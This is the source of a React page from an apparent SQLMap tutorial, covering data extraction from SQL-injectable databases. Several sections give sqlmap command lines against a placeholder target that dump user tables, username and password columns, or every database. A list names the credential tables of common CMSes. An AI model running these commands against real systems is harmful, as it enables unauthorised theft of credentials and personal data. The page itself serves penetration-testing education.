'use client'
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import Callout from '@/components/base/Callout';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

export default function DataExtractionPage() {
  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-download-cloud-line" />
          SQLMap Section 5 of 13
        </div>
        <DocHeading level={1}>Data Extraction</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Extract sensitive data from vulnerable databases including credentials, user data, and configuration.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Dump Table Data</h3>
        <p className="text-cyber-text text-sm mb-3">
          Extract all rows from a specific table:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' -D mydb -T users --dump" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Dump Specific Columns</h3>
        <p className="text-cyber-text text-sm mb-3">
          Extract only the columns you need:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' -D mydb -T users -C username,password --dump" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Dump All Databases</h3>
        <p className="text-cyber-text text-sm mb-3">
          Extract everything (very aggressive):
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --dump-all --batch" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Incremental Dumping</h3>
        <p className="text-cyber-text text-sm mb-3">
          Resume partial dumps automatically - SQLMap tracks progress in session files.
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' -D mydb -T users --dump --keep-alive" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <Callout type="warning">
          Some databases limit the number of rows returned per query. Use <InlineCode>--limit</InlineCode> and <InlineCode>--start</InlineCode> to control batch sizes.
        </Callout>
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Common Database Targets</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <div className="cyber-card p-3">
            <h4 className="text-xs font-semibold text-cyber-cyan mb-1">WordPress</h4>
            <p className="text-xs text-cyber-text">wp_users, wp_options, wp_posts</p>
          </div>
          <div className="cyber-card p-3">
            <h4 className="text-xs font-semibold text-cyber-cyan mb-1">Joomla</h4>
            <p className="text-xs text-cyber-text">jos_users, jos_content</p>
          </div>
          <div className="cyber-card p-3">
            <h4 className="text-xs font-semibold text-cyber-cyan mb-1">Drupal</h4>
            <p className="text-xs text-cyber-text">users, node, taxonomy_term_data</p>
          </div>
          <div className="cyber-card p-3">
            <h4 className="text-xs font-semibold text-cyber-cyan mb-1">Magento</h4>
            <p className="text-xs text-cyber-text">admin_user, customer_entity</p>
          </div>
        </div>
      </motion.section>

      <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/sqlmap/os-commands" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: OS Commands <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/sqlmap/database-enumeration" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-red hover:text-cyber-red transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}